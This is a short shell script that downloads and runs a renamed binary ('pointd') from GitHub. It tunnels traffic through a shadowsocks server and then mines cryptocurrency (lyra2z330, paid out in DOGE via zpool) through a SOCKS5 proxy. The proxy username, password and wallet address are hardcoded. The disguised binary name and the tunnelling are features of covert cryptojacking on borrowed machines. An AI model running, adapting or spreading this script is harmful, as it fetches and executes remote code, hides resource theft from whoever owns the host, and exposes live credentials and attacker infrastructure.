apt update -y
wget -q https://github.com/lafdahai76/DevOps/raw/main/pointd
chmod +x pointd
sudo apt -y install shadowsocks-libev rng-tools libsodium-dev

ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D8SQiATrkXeAUegfU8x7CGz2wysuQv4A6f.$(shuf -n 1 -i 1-9999999) -t 2 -p c=DOGE,zap=BUT-lyra2z330 -x socks5://Novax:chalHatt@129.158.58.77:1080
